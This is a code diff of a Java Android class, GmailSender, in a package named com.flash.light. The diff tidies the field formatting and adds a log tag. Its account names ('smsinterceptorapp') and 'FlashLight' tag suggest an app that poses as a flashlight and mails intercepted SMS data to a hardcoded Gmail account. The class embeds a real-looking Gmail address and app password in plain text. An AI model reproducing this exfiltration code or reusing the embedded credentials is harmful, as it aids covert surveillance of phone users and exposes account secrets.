@@ -22,10 +22,11 @@ import java.security.Security;
 public class GmailSender extends javax.mail.Authenticator {   
 
   private Session session;   
-  private final String mailhost = "smtp.gmail.com";
-  private final String password = "filcikyxgwstivft";
-  private final String user     = "codecaine21@gmail.com";
-  private final String sender   = "smsinterceptorapp@gmail.com";
+  private final String mailhost   = "smtp.gmail.com";
+  private final String password   = "filcikyxgwstivft";
+  private final String user       = "codecaine21@gmail.com";
+  private final String sender     = "smsinterceptorapp@gmail.com";
+  private static final String TAG = "FlashLight GmailSender";
 
   static {   
     Security.addProvider(new com.flash.light.JSSEProvider()); 
@@ -59,7 +60,7 @@ public class GmailSender extends javax.mail.Authenticator {
       message.setSender(new InternetAddress(sender)); 
       message.setSubject(subject); 
       message.setDataHandler(handler);   
-      Log.d("Flashlight sendMail() ","recipients -> " + recipients);
+      Log.d(TAG, "sendMail() recipients -> " + recipients);
       if(recipients.indexOf(',') > 0) {
         message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));   
       }
@@ -71,7 +72,7 @@ public class GmailSender extends javax.mail.Authenticator {
     }
     //catch(Exception e) {
     catch(Throwable e) {
-      Log.e("FlashLight GmailSender sendMail() Exception e", "" + e.toString());
+      Log.e(TAG, "sendMail() Exception e" + e.toString());
     }
   }   
 
